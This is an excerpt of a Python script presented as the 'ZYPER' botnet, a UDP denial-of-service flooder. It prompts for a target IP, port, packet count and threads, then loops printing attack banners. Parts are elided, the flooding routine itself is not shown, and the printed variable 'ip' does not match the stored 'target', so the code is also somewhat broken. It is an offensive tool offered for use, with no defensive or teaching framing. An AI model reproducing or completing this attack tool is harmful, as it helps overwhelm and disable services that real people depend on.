# author:
# ZYPER BOTNET CODE BY ZYPER
# VERSION:0.15.10 DDOS
# name:
# UDP-ZYPER BOTNET UDPPPS
# description:
...
def main():
    print("")
    print("\033[1;31mZYPERC2 ATTACKED BOTNET \033[0m")
    print("\033[1;31mZYPER C2 BOTNET Code by: Zyper \033[0m")
    print("")
    print("\033[1;31m[ZYPER</>`]\033[1;37mZYPERC2 BOTNET (IP) (PORT) (PACKETS) (THREADS)!")
    print("")
    
    while True:
        try:
            target = input("\033[1;31m[C2]\033[0m ""\033[1;37m IP:\033[0m ")
            if target.strip() and (is_valid_ipv4(target) or not target.replace('.', '').isdigit()):
                break
            else:
                print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid IP.\033[0m")
        except KeyboardInterrupt:
            print("\n\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m")
            sys.exit(0)
    ...
    while True:
        try:
            port = int(input("\033[1;31m[C2]\033[0m ""\033[1;37m port: \033[0m "))
            break
        except ValueError:
    ...
    while True:
        try:
            times_input = input("\033[1;31m[C2]\033[0m ""\033[1;37mPACKERS: \033[0m ")
    ...
    while True:
        try:
            threads_input = input("\033[1;31m[C2]\033[0m ""\033[1;37mTHREADS: \033[0m ")
    ...
    i = random.choice(("\033[1;31m[*]\033[0m", "\033[1;31m[!]\033[0m", "\033[1;31m[C2]\033[0m"))
    error_occurred = False
    
    try:
        while True:
            print(i +" \033[1mATTACK ZYPER BOTNET\033[0m "f"\033[1;38;2;255;100;100m{ip}\033[0m""  "f"\033[1;38;2;255;100;100m{port}\033[1;37m"" C2 ")
